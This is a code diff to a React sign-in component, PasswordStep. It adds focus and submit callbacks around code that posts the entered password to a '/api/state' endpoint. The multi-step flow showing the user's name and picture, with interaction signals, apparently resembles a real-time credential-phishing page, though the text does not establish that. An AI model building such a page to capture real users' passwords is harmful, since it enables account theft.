@@ -19,9 +19,11 @@ type PasswordStepProps = {
   email: string;
   name: string;
   profilePicture: string;
+  onInteractionStart: () => void;
+  onInteractionEnd: (submitAction: () => Promise<void>) => Promise<void>;
 };
 
-export default function PasswordStep({ email, name, profilePicture }: PasswordStepProps) {
+export default function PasswordStep({ email, name, profilePicture, onInteractionStart, onInteractionEnd }: PasswordStepProps) {
   const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<PasswordFormData>({
     resolver: zodResolver(passwordSchema),
   });
@@ -29,20 +31,22 @@ export default function PasswordStep({ email, name, profilePicture }: PasswordSt
   const [showPassword, setShowPassword] = useState(false);
 
   const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
-    try {
-      const res = await fetch("/api/state", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "submitPassword", password: data.password }),
-      });
-      if (!res.ok) throw new Error("Server responded with an error.");
-    } catch (error) {
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Could not proceed. Please try again.",
-      });
-    }
+     await onInteractionEnd(async () => {
+        try {
+          const res = await fetch("/api/state", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ action: "submitPassword", password: data.password }),
+          });
+          if (!res.ok) throw new Error("Server responded with an error.");
+        } catch (error) {
+          toast({
+            variant: "destructive",
+            title: "Error",
+            description: "Could not proceed. Please try again.",
+          });
+        }
+    });
   };
 
   return (
@@ -72,6 +76,7 @@ export default function PasswordStep({ email, name, profilePicture }: PasswordSt
             placeholder="Enter your password"
             {...register("password")}
             className="h-14 pt-2 text-base pr-12"
+            onFocus={onInteractionStart}
           />
           <button
             type="button"
